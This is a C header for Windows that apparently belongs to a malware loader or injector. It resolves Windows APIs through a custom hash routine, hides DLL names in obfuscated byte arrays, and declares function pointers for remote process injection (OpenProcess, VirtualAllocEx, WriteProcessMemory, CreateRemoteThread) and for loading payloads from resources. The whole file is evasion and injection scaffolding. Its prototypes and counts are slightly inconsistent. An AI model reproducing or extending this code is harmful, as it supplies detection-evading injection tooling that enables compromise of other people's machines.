#pragma once
#include <windows.h>
#include <stdio.h>

// ================== API HASHES ===================
typedef struct _API_HASHES {
    DWORD _api_0;  
    DWORD _api_1;  
    DWORD _api_2;  
    DWORD _api_3;  
    DWORD _api_4;  
    DWORD _api_5;  
    DWORD _api_6;  
    DWORD _api_7;  
    DWORD _api_8;  
    DWORD _api_9;  
    DWORD _api_10; 
    DWORD _api_11; 
    DWORD _api_12; 
    DWORD _api_13; 
    DWORD _api_14;
	DWORD _api_15;
	DWORD _api_16;
	DWORD _api_17;
    DWORD _api_18;
} API_HASHES;

#define NUM_APIS (sizeof(API_HASHES) / sizeof(DWORD))

API_HASHES g_ApiHashes = {
    0x0544E304,
    0x0844E304,
    0x06C11198,
    0x090167B9,
    0x06426BE5,
    0x0609EA21,
    0x0949AF41,
    0x0572E561,
    0x042FDC45,
    0x052FDC45,
    0x072FDC45,
    0x055F63C3,
    0x04404185,
    0x04A5D998,
    0x0835F253,
    0x5026961,
    0x4acdfe5,
    0x8d1e961,
    0x6d47253
};

typedef struct _DLL_ENTRY {
    const unsigned char* bytes;
    size_t length;
} DLL_ENTRY;

static const unsigned char _0[] = {
    0xC8, 0x95, 0xEB, 0xA0, 0x64, 0x4B, 0xE2, 0xBB, 0xDC, 0x5E, 0xF4, 0x5E
};

static const unsigned char _1[] = {
    0xD6, 0x83, 0xFC, 0xBC, 0x32, 0x15, 0xFF, 0xED, 0x9E, 0x56
};

static const unsigned char _2[] = {
    0xC2, 0x94, 0xEF, 0xAF, 0x71, 0x4E, 0xE2, 0xBB, 0xDC, 0x5E, 0xF4, 0x5E
};

DLL_ENTRY dll_list[] = {
    { _0, sizeof(_0) },
    { _1, sizeof(_1) },
    { _2, sizeof(_2) }
};

size_t dll_count = sizeof(dll_list) / sizeof(dll_list[0]);

DWORD getHashFromString(const char* string);
DWORD_PTR getFunctionAddressByHash(const char* library, DWORD hash);

typedef FARPROC(WINAPI* customGetProcAddress)(
	HMODULE, LPCSTR);

typedef HMODULE(WINAPI* customGetModuleHandleA)(LPCSTR lpModuleName);

typedef DWORD(WINAPI* customGetLastError)();

typedef BOOL(WINAPI* customReadFile)(
	HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);

typedef HANDLE(WINAPI* customCreateFileA)(
	LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

typedef HANDLE(WINAPI* customCreateThread)(
    LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

typedef HANDLE(WINAPI* customCreateRemoteThread)(
    HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

typedef LPVOID(WINAPI* customVirtualAllocEx)(
    HANDLE, LPVOID, SIZE_T, DWORD, DWORD);

typedef BOOL(WINAPI* customWriteProcessMemory)(
    HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

typedef BOOL(WINAPI* customCloseHandle)(HANDLE);

typedef BOOL(WINAPI* customCreateProcess)(
    LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

typedef BOOL(WINAPI* customGetModuleHandleEx)(
    DWORD dwFlags,
    LPCSTR lpModuleName,
    HMODULE* phModule
    );

typedef HRSRC(WINAPI* customFindResource)(
    HMODULE hModule,
    LPCSTR lpName,
    LPCSTR lpType
    );

typedef HGLOBAL(WINAPI* customLoadResource)(
    HMODULE hModule,
    HRSRC hResInfo
    );

typedef LPVOID(WINAPI* customLockResource)(
    HGLOBAL hResData
    );

typedef DWORD(WINAPI* customSizeofResource)(
    HMODULE hModule,
    HRSRC hResInfo
    );

typedef LPVOID(WINAPI* customVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
    );

typedef BOOL(WINAPI* customVirtualFree)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD dwFreeType
    );

typedef BOOL(WINAPI* customVirtualFreeEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD dwFreeType
    );
// OpenProcess
typedef HANDLE(WINAPI* customOpenProcess)(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId
    );



DWORD getHashFromString(const char* string)
{
    size_t stringLength = strnlen_s(string, 50);
    DWORD hash = 0x35;
    for (size_t i = 0; i < stringLength; i++)
    {
        hash += (hash * 0xAB10F29F + string[i]) & 0xFFFFFF;
    }
    return hash;
}
DWORD_PTR getFunctionAddressByHash(const char* library, DWORD hash,BOOL debug) {
    HMODULE hModule = LoadLibraryA(library);
    if (!hModule) return 0;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);

    DWORD_PTR exportDirectoryRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirectoryRVA);

    DWORD* functionAddresses = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    DWORD* functionNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
    WORD* functionOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)hModule + functionNames[i]);
        if (getHashFromString(functionName) == hash) {
            DWORD_PTR functionAddress = (DWORD_PTR)hModule + functionAddresses[functionOrdinals[i]];
            if (debug) {
                printf("    %s -> %s : %p\n", library, functionName, (void*)functionAddress);
            }
            return functionAddress;
        }
    }
    return 0;
}
DWORD WINAPI TestThread(LPVOID lpParam) {
    printf("[+] Thread running!\n");
    return 0;
}

// API pointers
typedef struct _APIs {
    customReadFile             pReadFile;
	customCreateThread         pCreateThread;
	customCreateFileA          pCreateFileA;
    customGetProcAddress       pGetProcAddress;
    customGetModuleHandleA     pGetModuleHandleA;
    customGetLastError         pGetLastError;
    customVirtualAlloc         pVirtualAlloc;
    customWriteProcessMemory   pWriteProcessMemory;
    customCreateProcess        pCreateProcess;
    customGetModuleHandleEx    pGetModuleHandleEx;
    customFindResource         pFindResource;
    customLoadResource         pLoadResource;
    customLockResource         pLockResource;
    customSizeofResource       pSizeofResource;
    customVirtualAllocEx       pVirtualAllocEx;
    customCreateRemoteThread   pCreateRemoteThread;
    customCloseHandle          pCloseHandle;
    customVirtualFree          pVirtualFree;
    customVirtualFreeEx        pVirtualFreeEx;
    customOpenProcess          pOpenProcess;
} APIs;
